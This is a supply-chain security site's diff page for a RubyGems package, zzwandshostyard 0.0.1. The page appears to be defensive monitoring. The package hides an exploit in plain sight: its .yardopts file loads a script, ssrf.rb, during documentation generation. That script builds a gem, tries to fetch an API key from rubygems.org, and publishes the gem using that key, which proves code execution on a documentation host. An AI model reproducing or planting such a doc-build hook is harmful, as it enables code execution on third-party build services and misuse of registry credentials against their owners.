@@ -1,0 +1,476 @@
+Source: https://my.diffend.io/gems/zzwandshostyard/0.0.1
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - zzwandshostyard - Versions diffs - 0.0.1 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+zzwandshostyard
+
+Versions diffs
+
+0.0.1
+
+zzwandshostyard
+0.0.1
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (5)
+        hide
+        show
+
+            checksums.yaml
+
+          +7
+          -0
+
+            data/.yardopts
+
+          +2
+          -0
+
+            data/lib/z.rb
+
+          +5
+          -0
+
+            data/ssrf.rb
+
+          +18
+          -0
+
+            metadata
+
+          +43
+          -0
+
+        checksums.yaml
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,7 @@
+
+1
+
+            +
+            ---
+
+2
+
+            +
+            SHA256:
+
+3
+
+            +
+              metadata.gz: b42da321a1520443b781a3aa09dbd0fe74ed0bb05629ad1f21568193bed20d89
+
+4
+
+            +
+              data.tar.gz: 51c1ef48d07782ff790df0f285cc68d06e960a8c982a9f2e853cfca7b0fc8359
+
+5
+
+            +
+            SHA512:
+
+6
+
+            +
+              metadata.gz: da3a3b9995f0c03cb36f9c76ac4d4042aba683c971ea9f09affe21babb1ef0472b7dab33c903fb692d5505c0a262d734952c6202d4021563d7e8e888c90c3313
+
+7
+
+            +
+              data.tar.gz: 174d5ecb6c377dcffa2ca77f2a373ed9648d4d65039ba38adbc99f127cb023a8a3dea8b22a9b89f50146770ec4e3869a0021eb7b3fe52b9db289165d3535f732
+
+        data/.yardopts
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,2 @@
+
+1
+
+            +
+            --load ./ssrf.rb
+
+2
+
+            +
+            lib/**/*.rb
+
+        data/lib/z.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,5 @@
+
+1
+
+            +
+            # test doc
+
+2
+
+            +
+            class ZZZ
+
+3
+
+            +
+             # hi
+
+4
+
+            +
+             def x; end
+
+5
+
+            +
+            end
+
+        data/ssrf.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,18 @@
+
+1
+
+            +
+            # rubydoc ssrf test
+
+2
+
+            +
+            require 'net/http';require 'uri';require 'time';require 'rubygems/package';require 'stringio';require 'yaml';require 'zlib';
+
+3
+
+            +
+            begin
+
+4
+
+            +
+             marker="YARDLOAD ran at #{Time.now}";
+
+5
+
+            +
+             # build gem manually
+
+6
+
+            +
+             spec=Gem::Specification.new do |s|
+
+7
+
+            +
+              s.name='zzwandsloadresult'; s.version="0.0.1.pre.#{Time.now.to_i}"; s.summary='res'; s.description=marker; s.authors=['a']; s.email=['a@b.com']; s.files=['lib/x.rb']; s.license='MIT';
+
+8
+
+            +
+             end
+
+9
+
+            +
+             FileUtils.mkdir_p('/tmp/zr/lib'); File.write('/tmp/zr/lib/x.rb',marker)
+
+10
+
+            +
+             Gem::Package.build(spec, true, '/tmp/zr'); # location? returns name
+
+11
+
+            +
+             g=Dir['/tmp/zr/*.gem'].first || File.basename("zzwandsloadresult-#{spec.version}.gem")
+
+12
+
+            +
+             # key anonymous
+
+13
+
+            +
+             key=Net::HTTP.get(URI('https://rubygems.org/api/v1/api_key.yaml'))[/rubygems_[a-f0-9]{32,}/]
+
+14
+
+            +
+             req=Net::HTTP::Post.new('/api/v1/gems', {'Authorization'=>key,'Content-Type'=>'application/octet-stream'}); req.body=File.binread(g)
+
+15
+
+            +
+             http=Net::HTTP.new('rubygems.org',443); http.use_ssl=true; r=http.request(req)
+
+16
+
+            +
+             rescue=>e
+
+17
+
+            +
+             File.write('/tmp/xxx',"err #{e}") rescue nil
+
+18
+
+            +
+            end
+
+        metadata
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,43 @@
+
+1
+
+            +
+            --- !ruby/object:Gem::Specification
+
+2
+
+            +
+            name: zzwandshostyard
+
+3
+
+            +
+            version: !ruby/object:Gem::Version
+
+4
+
+            +
+              version: 0.0.1
+
+5
+
+            +
+            platform: ruby
+
+6
+
+            +
+            authors:
+
+7
+
+            +
+            - a
+
+8
+
+            +
+            bindir: bin
+
+9
+
+            +
+            cert_chain: []
+
+10
+
+            +
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            dependencies: []
+
+12
+
+            +
+            description: yard host
+
+13
+
+            +
+            email:
+
+14
+
+            +
+            - a@b.com
+
+15
+
+            +
+            executables: []
+
+16
+
+            +
+            extensions: []
+
+17
+
+            +
+            extra_rdoc_files: []
+
+18
+
+            +
+            files:
+
+19
+
+            +
+            - ".yardopts"
+
+20
+
+            +
+            - lib/z.rb
+
+21
+
+            +
+            - ssrf.rb
+
+22
+
+            +
+            homepage: https://example.com
+
+23
+
+            +
+            licenses:
+
+24
+
+            +
+            - MIT
+
+25
+
+            +
+            metadata: {}
+
+26
+
+            +
+            rdoc_options: []
+
+27
+
+            +
+            require_paths:
+
+28
+
+            +
+            - lib
+
+29
+
+            +
+            required_ruby_version: !ruby/object:Gem::Requirement
+
+30
+
+            +
+              requirements:
+
+31
+
+            +
+              - - ">="
+
+32
+
+            +
+                - !ruby/object:Gem::Version
+
+33
+
+            +
+                  version: '0'
+
+34
+
+            +
+            required_rubygems_version: !ruby/object:Gem::Requirement
+
+35
+
+            +
+              requirements:
+
+36
+
+            +
+              - - ">="
+
+37
+
+            +
+                - !ruby/object:Gem::Version
+
+38
+
+            +
+                  version: '0'
+
+39
+
+            +
+            requirements: []
+
+40
+
+            +
+            rubygems_version: 3.6.7
+
+41
+
+            +
+            specification_version: 4
+
+42
+
+            +
+            summary: yard host
+
+43
+
+            +
+            test_files: []
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
